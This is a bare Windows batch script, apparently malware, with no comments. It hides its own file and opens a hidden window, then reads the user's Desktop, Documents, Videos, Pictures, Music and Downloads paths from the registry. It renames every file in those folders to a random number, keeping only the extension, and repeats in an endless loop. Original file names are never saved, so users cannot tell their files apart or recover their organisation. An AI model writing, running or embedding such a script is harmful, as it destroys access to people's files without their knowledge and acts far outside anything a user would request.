@echo off
set BATFILE=%~f0
attrib +h "%BATFILE%"
powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '"
setlocal enabledelayedexpansion
for /f "usebackq delims=" %%A in (`reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Desktop" ^| findstr "REG_"`) do (
  set "desktopPath=%%A"
)
for /f "usebackq delims=" %%A in (`reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Personal" ^| findstr "REG_"`) do (
  set "documentsPath=%%A"
)
for /f "usebackq delims=" %%A in (`reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "My Video" ^| findstr "REG_"`) do (
  set "videoPath=%%A"
)
for /f "usebackq delims=" %%A in (`reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "My Pictures" ^| findstr "REG_"`) do (
  set "picturesPath=%%A"
)
for /f "usebackq delims=" %%A in (`reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "My Music" ^| findstr "REG_"`) do (
  set "musicPath=%%A"
)
set "desktopPath=!desktopPath:*REG_SZ=!"
set "documentsPath=!documentsPath:*REG_SZ=!"
set "videoPath=!videoPath:*REG_SZ=!"
set "picturesPath=!picturesPath:*REG_SZ=!"
set "musicPath=!musicPath:*REG_SZ=!"
set "downloadsPath=%userprofile%\downloads"
setlocal
set "desktopPath=%desktopPath: =%"
set "documentsPath=%documentsPath: =%"
set "videoPath=%videoPath: =%"
set "picturesPath=%picturesPath: =%"
set "musicPath=%musicPath: =%"
set "downloadsPath=%downloadsPath: =%"
:renameFiles

for %%A in ("%desktopPath%\*") do (
    set "randomNumber=!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!"
    ren "%%A" "!randomNumber!%%~xA"
)

for %%A in ("%documentsPath%\*") do (
    set "randomNumber=!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!"
    ren "%%A" "!randomNumber!%%~xA"
)

for %%A in ("%videoPath%\*") do (
    set "randomNumber=!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!"
    ren "%%A" "!randomNumber!%%~xA"
)

for %%A in ("%picturesPath%\*") do (
    set "randomNumber=!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!"
    ren "%%A" "!randomNumber!%%~xA"
)

for %%A in ("%musicPath%\*") do (
    set "randomNumber=!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!"
    ren "%%A" "!randomNumber!%%~xA"
)
for %%A in ("%downloadsPath%\*") do (
    set "randomNumber=!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!"
    ren "%%A" "!randomNumber!%%~xA"
)

goto :renameFiles

